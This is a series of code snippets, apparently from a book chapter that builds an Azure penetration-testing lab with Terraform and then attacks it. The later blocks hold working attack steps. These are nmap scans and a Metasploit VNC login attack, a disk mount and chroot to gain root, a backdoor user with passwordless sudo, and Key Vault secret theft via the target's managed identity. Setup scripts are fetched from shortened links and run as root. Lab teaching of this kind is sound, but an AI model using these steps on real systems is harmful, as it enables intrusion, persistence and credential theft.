["```\n    cd ~\n    mkdir kali_keys && cd kali_keys\n    ```", "```\n    ssh-keygen -t rsa -C kali -f ./kali-ssh\n    ```", "```\n    cat kali-ssh.pub\n    ```", "```\n    cd ~\n    mkdir -p pentest_lab && cd pentest_lab\n    ```", "```\n    mkdir -p secure_network\n    mkdir -p target_vm\n    mkdir -p attacker_vm\n    ```", "```\n    touch main.tf\n    touch variables.tf\n    touch outputs.tf\n    touch terraform.tfvars\n    touch versions.tf\n    touch provider.tf\n    ```", "```\n     provider \"azurerm\" {\n      features {}\n    }\n    ```", "```\n    terraform {\n      required_version = \">=0.12\"required_providers {\n        azurerm = {\n          source  = \"hashicorp/azurerm\"\n          version = \"~>2.0\"\n        }\n        random = {\n          source  = \"hashicorp/random\"\n          version = \"~>3.0\"\n        }\n      }\n    }\n    ```", "```\n     variable \"my_ip\" {\n      type = string\n    }\n    variable \"kali_image_id\" {\n      type = string\n    }\n    variable \"my_public_ssh_key\" {\n      type = string\n    }\n    ```", "```\n     my_ip = \"<INSERT IP ADDRESS>\"\n    kali_image_id = \"<INSERT KALI IMAGE ID>\"\n    my_public_ssh_key = \"<INSERT PUBLIC SSH KEY>\"\n    ```", "```\n     module \"secure_network\" {\n      source = \"./secure_network\"\n    }\n    module \"attacker_vm\" {\n      source = \"./attacker_vm\"\n    }\n    module \"target_vm\" {\n      source = \"./target_vm\"\n    }\n    ```", "```\n    touch secure_network/main.tf\n    ```", "```\n     resource \"azurerm_resource_group\" \"rg_01\" {\n      location = \"eastus\"\n      name     = \"resource-group-01\"\n    }\n    resource \"azurerm_resource_group\" \"rg_02\" {\n      location = \"eastus\"\n      name     = \"resource-group-02\"\n    }\n    ```", "```\n    terraform init\n    ```", "```\n    terraform plan\n    ```", "```\n    ... Plan: 2 to add, 0 to change, 0 to destroy. ...\n    ```", "```\n    terraform apply -auto-approve\n    ```", "```\n    ... Apply complete! Resources: 2 added, 0 changed, 0 destroyed. ...\n    ```", "```\n    terraform show\n    ```", "```\n     module \"secure_network\" {\n      source = \"./secure_network\"\n    }\n    ```", "```\n    module \"secure_network\" {\n      source = \"./secure_network\"\n      my_ip = var.my_ip }\n    ```", "```\n    touch secure_network/variables.tf\n    ```", "```\n     variable \"my_ip\" {\n      type = string\n    }\n    ```", "```\n     resource \"azurerm_virtual_network\" \"vnet_01\" {\n      name                = \"vnet-01\"\n      address_space       = [\"10.0.0.0/16\"]\n      location            = (azurerm_resource_group\n                              .rg_01.location)\n      resource_group_name = (azurerm_resource_group\n                              .rg_01.name)\n    }\n    resource \"azurerm_subnet\" \"subnet_01\" {\n      name                 = \"subnet-01\"\n      resource_group_name  = (azurerm_resource_group\n                              .rg_01.name)\n      virtual_network_name = (azurerm_virtual_network\n                              .vnet_01.name)\n      address_prefixes     = [\"10.0.1.0/24\"]\n    }\n    ```", "```\n     resource \"azurerm_application_security_group\" \"asg_01\" {\n      name                = \"asg-01\"\n      location            = (azurerm_resource_group\n                              .rg_01.location)\n      resource_group_name = (azurerm_resource_group\n                              .rg_01.name)\n    }\n    resource \"azurerm_network_security_group\" \"nsg_01\" {\n      name                = \"nsg-01\"\n      location            = (azurerm_resource_group\n                              .rg_01.location)\n      resource_group_name = (azurerm_resource_group\n                              .rg_01.name)\n    }\n    ```", "```\n     resource \"azurerm_virtual_network\" \"vnet_02\" {\n      name                = \"vnet-02\"\n      address_space       = [\"192.168.0.0/16\"]\n      location            = (azurerm_resource_group\n                              .rg_02.location)\n      resource_group_name = (azurerm_resource_group\n                              .rg_02.name)\n    }\n    resource \"azurerm_subnet\" \"subnet_02\" {\n      name                 = \"subnet-02\"\n      resource_group_name  = (azurerm_resource_group\n                              .rg_02.name)\n      virtual_network_name = (azurerm_virtual_network\n                              .vnet_02.name)\n      address_prefixes     = [\"192.168.1.0/24\"]\n    }\n    ```", "```\n     resource \"azurerm_application_security_group\" \"asg_02\" {\n      name                = \"asg-02\"\n      location            = (azurerm_resource_group\n                              .rg_02.location)\n      resource_group_name = (azurerm_resource_group\n                              .rg_02.name)\n    }\n    resource \"azurerm_network_security_group\" \"nsg_02\" {\n      name                = \"nsg-02\"\n      location            = (azurerm_resource_group\n                              .rg_02.location)\n      resource_group_name = (azurerm_resource_group\n                              .rg_02.name)\n    }\n    ```", "```\n     resource \"azurerm_virtual_network_peering\" \"peer_1_to_2\" {\n      name                      = \"peer1to2\"\n      resource_group_name       = (azurerm_resource_group\n                                    .rg_01.name)\n      virtual_network_name      = (azurerm_virtual_network\n                                    .vnet_01.name)\n      remote_virtual_network_id = (azurerm_virtual_network\n                                    .vnet_02.id)\n    }\n    resource \"azurerm_virtual_network_peering\" \"peer_2_to_1\" {\n      name                      = \"peer2to1\"\n      resource_group_name       = (azurerm_resource_group\n                                    .rg_02.name)\n      virtual_network_name      = (azurerm_virtual_network\n                                    .vnet_02.name)\n      remote_virtual_network_id = (azurerm_virtual_network\n                                    .vnet_01.id)\n    }\n    ```", "```\n     resource \"azurerm_network_security_rule\" \"desktop-access\" {\n      name                        = \"Desktop-Access\"\n      priority                    = 900\n      direction                   = \"Inbound\"\n      access                      = \"Allow\"\n      protocol                    = \"*\"\n      source_port_range           = \"*\"\n      destination_port_range      = \"8081\"\n      source_address_prefix= \"${var.my_ip}/32\" destination_address_prefix  = (\n        azurerm_subnet.subnet_02.address_prefix )\n      resource_group_name         = (\n        azurerm_resource_group.rg_02.name\n      )\n      network_security_group_name = (\n        azurerm_network_security_group.nsg_02.name\n      )\n    }\n    ```", "```\n     resource \"azurerm_network_security_rule\" \"ssh-access\" {\n      name                        = \"SSH-Access\"\n      priority                    = 1000\n      direction                   = \"Inbound\"\n      access                      = \"Allow\"\n      protocol                    = \"*\"\n      source_port_range           = \"*\"\n      destination_port_range      = \"22\"\n      source_address_prefix= \"${var.my_ip}/32\" destination_address_prefix  = (\n        azurerm_subnet.subnet_02.address_prefix )\n      resource_group_name         = (\n        azurerm_resource_group.rg_02.name\n      )\n      network_security_group_name = (\n        azurerm_network_security_group.nsg_02.name\n      )\n    }\n    ```", "```\n    touch secure_network/outputs.tf\n    ```", "```\n     output \"asg_01\" {\n      value = azurerm_application_security_group.asg_01.id\n    }\n    output \"nsg_01\" {\n      value = azurerm_network_security_group.nsg_01.id\n    }\n    output \"rg_01_location\" {\n      value = azurerm_resource_group.rg_01.location\n    }\n    output \"rg_01_name\" {\n      value = azurerm_resource_group.rg_01.name\n    }\n    output \"subnet_01\" {\n      value = azurerm_subnet.subnet_01.id\n    }\n    ```", "```\n     output \"asg_02\" {\n      value = azurerm_application_security_group.asg_02.id\n    }\n    output \"nsg_02\" {\n      value = azurerm_network_security_group.nsg_02.id\n    }\n    output \"rg_02_location\" {\n      value = azurerm_resource_group.rg_02.location\n    }\n    output \"rg_02_name\" {\n      value = azurerm_resource_group.rg_02.name\n    }\n    output \"subnet_02\" {\n      value = azurerm_subnet.subnet_02.id\n    }\n    ```", "```\n    cd ~/pentest_lab\n    ```", "```\n    terraform plan\n    ```", "```\n    ... Plan: 12 to add, 0 to change, 0 to destroy. ...\n    ```", "```\n    terraform apply -auto-approve\n    ```", "```\n    touch target_vm/main.tf\n    touch target_vm/variables.tf\n    touch target_vm/outputs.tf\n    ```", "```\n    DOWNLOAD_URL=**https://raw.githubusercontent.com/PacktPublishing/Building-and-Automating-Penetration-Testing-Labs-in-the-Cloud/main/ch05/pentest_lab/target_vm/boot-script.sh**\n    wget -O target_vm/boot-script.sh $DOWNLOAD_URL\n    ```", "```\n     variable \"asg\" {\n      type = string\n    }\n    variable \"nsg\" {\n      type = string\n    }\n    variable \"rg_location\" {\n      type = string\n    }\n    variable \"rg_name\" {\n      type = string\n    }\n    variable \"subnet\" {\n      type = string\n    }\n    ```", "```\n     resource \"random_string\" \"random_password\" {\n      length           = 12\n      special          = true\n      override_special = \"!#$%&\"\n      min_lower        = 2\n      min_special      = 2\n      min_upper        = 2\n    }\n    locals {\n        vm_username = \"testuser\"vm_password = random_string.random_password.result\n    }\n    ```", "```\n     resource \"azurerm_public_ip\" \"public_ip_target\" {\n      name                = \"public-ip-target\"\n      location            = var.rg_location\n      resource_group_name = var.rg_name\n      allocation_method   = \"Dynamic\"\n    }\n    resource \"azurerm_network_interface\" \"nic_target\" {\n      name                = \"nic-target\"\n      location            = var.rg_location\n      resource_group_name = var.rg_name\n      ip_configuration {\n        name          = \"nic_configuration_target\"\n        subnet_id                     = var.subnet\n        private_ip_address_allocation = \"Dynamic\"\n        public_ip_address_id          = (\n          azurerm_public_ip.public_ip_target.id\n        )\n      }\n    }\n    ```", "```\n     resource \"azurerm_network_interface_security_group_association\" \"nsg_assoc_target\" {\n      network_interface_id      = (\n        azurerm_network_interface.nic_target.id\n      )\n      network_security_group_id = var.nsg\n    }\n    resource \"azurerm_network_interface_application_security_group_association\" \"asg_assoc_target\" {\n      network_interface_id          = (\n        azurerm_network_interface.nic_target.id\n      )\n      application_security_group_id = var.asg\n    }\n    ```", "```\n     resource \"azurerm_linux_virtual_machine\" \"vm_target\" {\n      name                  = \"vm-target\"\n      location              = var.rg_location\n      resource_group_name   = var.rg_name\n      size                  = \"Standard_D2s_v3\"\n      network_interface_ids = (\n        [azurerm_network_interface.nic_target.id]\n      )\n      os_disk {\n        name                 = \"os-disk-target\"\n        caching              = \"ReadWrite\"\n        storage_account_type = \"Standard_LRS\"\n      }source_image_reference {\n        publisher = \"Canonical\"\n        offer     = \"0001-com-ubuntu-server-jammy\"\n        sku       = \"22_04-lts-gen2\"\n        version   = \"latest\"\n      }\n      computer_name                   = \"vm-target\"\n      admin_username                  = local.vm_username\n      admin_password                  = local.vm_password\n      disable_password_authentication = false\n      boot_diagnostics {\n        storage_account_uri = null\n      }\n      identity {\n        type = \"SystemAssigned\"\n      }custom_data = (\n        base64encode(\n          templatefile(\n            \"${path.module}/boot-script.sh\",\n            {}\n          )\n        )\n      )\n    }\n    ```", "```\n     resource \"azurerm_key_vault\" \"key_vault\" {\n      name                        = \"rg-01-key-vault\"\n      location                    = var.rg_location\n      resource_group_name         = var.rg_name\n      sku_name                    = \"standard\"\n      tenant_id                   = (\n        data.azurerm_client_config.current.tenant_id\n      )\n      soft_delete_retention_days  = 7\n      purge_protection_enabled    = false\n      access_policy {\n        tenant_id = (\n          data.azurerm_client_config\n              .current.tenant_id\n        )\n        object_id = (\n          azurerm_linux_virtual_machine\n            .vm_target\n            .identity[0]\n            .principal_id\n        )secret_permissions = [\n          \"Get\",\n          \"Set\",\n          \"List\"\n        ]\n      }access_policy {\n        tenant_id = (\n          data.azurerm_client_config\n              .current.tenant_id\n        )\n        object_id = (\n          azurerm_user_assigned_identity\n              .managed_identity\n              .principal_id\n        )secret_permissions = [\n          \"Get\",\n          \"Set\",\n          \"List\"\n        ]\n      }\n    }\n    ```", "```\n     resource \"azurerm_user_assigned_identity\" \"managed_identity\" {\n      name                = \"managed-identity\"\n      location            = var.rg_location\n      resource_group_name = var.rg_name\n    }\n    ```", "```\n     data \"azurerm_client_config\" \"current\" {}\n    data \"azurerm_subscription\" \"current\" {}\n    ```", "```\n     resource \"azurerm_role_assignment\" \"role_assignment_01\" {\n      scope                = (\n        \"/subscriptions/${(\n          data.azurerm_subscription\n              .current\n              .subscription_id\n         )}/resourceGroups/${var.rg_name}\"\n      )\n      role_definition_name = \"Contributor\"principal_id         = (\n        azurerm_user_assigned_identity\n          .managed_identity\n          .principal_id\n      )\n    }\n    ```", "```\n     resource \"azurerm_role_assignment\" \"role_assignment_02\" {\n      scope                = (\n        \"/subscriptions/${(\n          data.azurerm_subscription\n              .current\n              .subscription_id\n        )}/resourceGroups/${var.rg_name}\"\n      )\n      role_definition_name = \"Contributor\"principal_id         = (\n        azurerm_linux_virtual_machine\n          .vm_target\n          .identity[0]\n          .principal_id\n        )\n    }\n    ```", "```\n     output \"vm_target_private_ip\" {\n      value = (azurerm_linux_virtual_machine\n                .vm_target\n                .private_ip_address)\n    }\n    output \"vm_target_public_ip\" {\n      value = (azurerm_linux_virtual_machine\n                .vm_target\n                .public_ip_address)\n    }\n    output \"vm_username\" {\n      value = local.vm_username\n    }\n    output \"vm_password\" {\n      value = local.vm_password\n    }\n    ```", "```\n     output \"vm_target_private_ip\" {\n      value = module.target_vm.vm_target_private_ip\n    }\n    output \"vm_target_public_ip\" {\n      value = module.target_vm.vm_target_public_ip\n    }\n    output \"vm_target_username\" {\n      value = module.target_vm.vm_username\n    }\n    output \"vm_target_password\" {\n      value = module.target_vm.vm_password\n    }\n    ```", "```\n     az keyvault secret set --vault-name rg-01-key-vault --name \"flag2\" --value \"FLAG # 2!\"\n    ```", "```\n    terraform plan\n    ```", "```\n     module \"target_vm\" {\n      source = \"./target_vm\"\n    }\n    ```", "```\n    module \"target_vm\" {\n      source = \"./target_vm\"\n      rg_location = module.secure_network.rg_01_location rg_name = module.secure_network.rg_01_name subnet = module.secure_network.subnet_01 asg = module.secure_network.asg_01 nsg = module.secure_network.nsg_01 }\n    ```", "```\n    terraform plan\n    ```", "```\n    terraform apply -auto-approve\n    ```", "```\n    vm_target_password = \"...\" vm_target_private_ip = \"...\" vm_target_public_ip = \"...\" vm_target_username = \"testuser\"\n    ```", "```\n    sudo docker ps\n    ```", "```\n    az login --identity\n    ```", "```\n    [\n      {\n        \"environmentName\": \"AzureCloud\",\n        \"homeTenantId\": \"...\",\n        \"id\": \"...\",\n        \"isDefault\": true,\n        \"managedByTenants\": [],\n        \"name\": \"Azure subscription 1\",\n        \"state\": \"Enabled\",\n        \"tenantId\": \"...\",\n        \"user\": {\n          \"assignedIdentityInfo\": \"MSI\",\n          \"name\": \"systemAssignedIdentity\",\n          \"type\": \"servicePrincipal\"\n        }\n      }\n    ]\n    ```", "```\n    az keyvault list\n    ```", "```\n    [\n      {\n        \"id\": \"...\",\n        \"location\": \"eastus\",\n        \"name\": \"rg-01-key-vault\",\n        \"resourceGroup\": \"resource-group-01\",\n        \"tags\": {},\n        \"type\": \"Microsoft.KeyVault/vaults\"\n      }\n    ]\n    ```", "```\n    az keyvault secret list --vault-name rg-01-key-vault\n    ```", "```\n    SCRIPT_URL=**https://bit.ly/kali-desktop-setup**\n    wget -O kali_setup.sh $SCRIPT_URL\n    ```", "```\n    cat kali_setup.sh\n    ```", "```\n    chmod +x kali_setup.sh\n    ```", "```\n    SCRIPT_2_URL=**https://bit.ly/setup-cron**\n    wget -O setup_cron_job.sh $SCRIPT_2_URL\n    ```", "```\n    cat setup_cron_job.sh\n    ```", "```\n    chmod +x setup_cron_job.sh\n    ```", "```\n    sudo ./kali_setup.sh\n    ```", "```\n    clear\n    ```", "```\n    sudo ./setup_cron_job.sh\n    ```", "```\n    sudo crontab -l\n    ```", "```\n    @reboot sleep 60 && /usr/bin/vncserver @reboot sleep 60 && /usr/share/novnc/utils/novnc_proxy --listen 0.0.0.0:8081 --vnc localhost:5901 >/dev/null 2>&1 &\n    ```", "```\n    sudo reboot\n    ```", "```\n    ps -ef | grep vnc\n    ```", "```\n    ... bash /usr/share/novnc/utils/novnc_proxy --listen 0.0.0.0:8081 --vnc localhost:5901 ... /usr/bin/perl /usr/bin/vncserver ... /usr/bin/python3 /usr/bin/websockify --web /usr/share/novnc/utils/../ 0.0.0.0:8081 localhost:5901 ...\n    ```", "```\n     /subscriptions/.../resourcegroups/image-resource-group/providers/Microsoft.Compute/galleries/kali_gallery/images/golden-image/versions/1.0.0\n    ```", "```\n    cd ~/pentest_lab\n    ```", "```\n    touch attacker_vm/main.tf\n    touch attacker_vm/variables.tf\n    touch attacker_vm/outputs.tf\n    ```", "```\n     variable \"source_image_id\" {\n      type = string\n    }\n    variable \"asg\" {\n      type = string\n    }\n    variable \"nsg\" {\n      type = string\n    }\n    variable \"rg_location\" {\n      type = string\n    }\n    variable \"rg_name\" {\n      type = string\n    }\n    variable \"subnet\" {\n      type = string\n    }\n    variable \"my_public_ssh_key\" {\n      type = string\n    }\n    ```", "```\n     resource \"azurerm_public_ip\" \"public_ip_attacker\" {\n      name                = \"public-ip-attacker\"\n      location            = var.rg_location\n      resource_group_name = var.rg_name\n      allocation_method   = \"Dynamic\"\n    }\n    resource \"azurerm_network_interface\" \"nic_attacker\" {\n      name                = \"nic-attacker\"\n      location            = var.rg_location\n      resource_group_name = var.rg_name\n      ip_configuration {\n        name                          = (\n          \"nic_configuration_attacker\"\n        )\n        subnet_id                     = var.subnet\n        private_ip_address_allocation = \"Dynamic\"\n        public_ip_address_id          = (\n          azurerm_public_ip.public_ip_attacker.id\n        )\n      }\n    }\n    ```", "```\n     resource \"azurerm_network_interface_security_group_association\" \"nsg_assoc_attacker\" {\n      network_interface_id      = (\n        azurerm_network_interface\n          .nic_attacker\n          .id\n      )\n      network_security_group_id = var.nsg\n    }\n    ```", "```\n     resource \"azurerm_network_interface_application_security_group_association\" \"asg_assoc_3\" {\n      network_interface_id          = (\n        azurerm_network_interface\n          .nic_attacker\n          .id\n      )\n      application_security_group_id = var.asg\n    }\n    ```", "```\n     resource \"azurerm_linux_virtual_machine\" \"vm_kali\" {\n      name                  = \"vm-kali\"\n      location              = var.rg_location\n      resource_group_name   = var.rg_name\n      size                  = \"Standard_DS1_v2\"\n      network_interface_ids = [\n        azurerm_network_interface.nic_attacker.id\n      ]\n      os_disk {\n        name                 = \"os-disk-kali\"\n        caching              = \"ReadWrite\"\n        storage_account_type = \"Standard_LRS\"\n      }\n      source_image_id = var.source_image_id plan {\n        name = \"kali\"\n        publisher = \"kali-linux\"\n        product = \"kali\"\n      }\n      computer_name                   = \"vm-kali\"\n      admin_ssh_key {\n        username   = \"kali_admin\"\n        public_key = var.my_public_ssh_key\n      }\n      admin_username                  = \"kali_admin\"\n      admin_password                  = \"KaliLinux1234!!!\"   disable_password_authentication = false\n      boot_diagnostics {\n        storage_account_uri = null\n      }\n    }\n    ```", "```\n     output \"vm_kali_private_ip\" {\n      value = (azurerm_linux_virtual_machine\n                .vm_kali\n                .private_ip_address)\n    }\n    output \"vm_kali_public_ip\" {\n      value = (azurerm_linux_virtual_machine\n                .vm_kali\n                .public_ip_address)\n    }\n    ```", "```\n     output \"vm_kali_private_ip\" {\n      value = module.attacker_vm.vm_kali_private_ip }\n    output \"vm_kali_public_ip\" {\n      value = module.attacker_vm.vm_kali_public_ip }\n    ```", "```\n    terraform plan\n    ```", "```\n     module \"attacker_vm\" {\n      source = \"./attacker_vm\"\n    }\n    ```", "```\n    module \"attacker_vm\" {\n      source = \"./attacker_vm\"\n      my_public_ssh_key = var.my_public_ssh_key source_image_id = var.kali_image_id rg_location = module.secure_network.rg_02_location rg_name = module.secure_network.rg_02_name subnet = module.secure_network.subnet_02 asg = module.secure_network.asg_02 nsg = module.secure_network.nsg_02 }\n    ```", "```\n    terraform plan\n    ```", "```\n     ... kali_image_id = \"<INSERT KALI IMAGE ID>\" ...\n    ```", "```\n    /subscriptions/.../resourcegroups/image-resource-group/providers/Microsoft.Compute/galleries/kali_gallery/images/golden-image/versions/1.0.0\n    ```", "```\n    terraform plan\n    ```", "```\n    terraform apply -auto-approve\n    ```", "```\n    ... vm_kali_private_ip = \"...\" vm_kali_public_ip = \"...\" vm_target_password = \"...\" vm_target_private_ip = \"...\" vm_target_public_ip = \"...\" vm_target_username = \"testuser\"\n    ```", "```\nssh -L 8081:localhost:8081 -N -i <INSERT KEY NAME> <USER>@<ATTACKER VM IP>\n```", "```\n     http://<ATTACKER VM PUBLIC IP ADDRESS>:8081/vnc.html\n    ```", "```\n     TARGET_IP=<PRIVATE IP ADDRESS OF TARGET VM>\n    ```", "```\n    nmap --top-ports 1000 $TARGET_IP\n    ```", "```\n    nmap --top-ports 1000 -sV -sS $TARGET_IP\n    ```", "```\n    msfconsole\n    ```", "```\n    search vnc login\n    ```", "```\n    use auxiliary/scanner/vnc/vnc_login\n    ```", "```\n    set RHOST <PRIVATE IP ADDRESS OF TARGET VM>\n    ```", "```\n    show options\n    ```", "```\n    run\n    ```", "```\n    exit\n    ```", "```\n    echo $TARGET_IP\n    ```", "```\n    vncviewer $TARGET_IP\n    ```", "```\n    id\n    ```", "```\n    lsb_release -a\n    ```", "```\n    fdisk -l\n    ```", "```\n    mount /dev/sda1 /mnt\n    ```", "```\n    cd /mnt\n    chroot .\n    ```", "```\n    id\n    ```", "```\n    uid=0(root) gid=0(root) groups=0(root)\n    ```", "```\n    lsb_release -a\n    ```", "```\n     bit.ly/create-ssh-user\n    ```", "```\n    NEW_USER=new_user\n    adduser --disabled-password --gecos \"\" $NEW_USER\n    echo \"$NEW_USER ALL=(ALL) NOPASSWD:ALL\" | tee -a /etc/sudoers >/dev/null\n    ```", "```\n    mkdir -p /home/$NEW_USER/.ssh\n    chown $NEW_USER:$NEW_USER /home/$NEW_USER/.ssh\n    chmod 700 /home/$NEW_USER/.ssh\n    echo \"$NEW_USER:password\" | chpasswd\n    systemctl restart ssh\n    ```", "```\n    echo $TARGET_IP\n    ```", "```\n    ssh new_user@$TARGET_IP\n    ```", "```\n    sudo su\n    ```", "```\n    find / -type f -name \"flag*\"\n    ```", "```\n    ... /root/flag1.txt\n    ...\n    ```", "```\n    cat /root/flag1.txt\n    ```", "```\n    which az\n    ```", "```\n    az --version\n    ```", "```\n    az login --identity\n    ```", "```\n    az keyvault list\n    ```", "```\n    az keyvault secret list --vault-name rg-01-key-vault\n    ```", "```\n    az keyvault secret show --vault-name rg-01-key-vault --name \"flag2\"\n    ```", "```\n    az keyvault secret show --vault-name rg-01-key-vault --name \"flag2\" --query \"value\"\n    ```", "```\nterraform apply -replace=module.target_vm.azurerm_linux_virtual_machine.vm_target -auto-approve\n```", "```\n    cd ~/pentest_lab\n    terraform destroy -auto-approve\n    ```", "```\n    terraform show\n    ```"]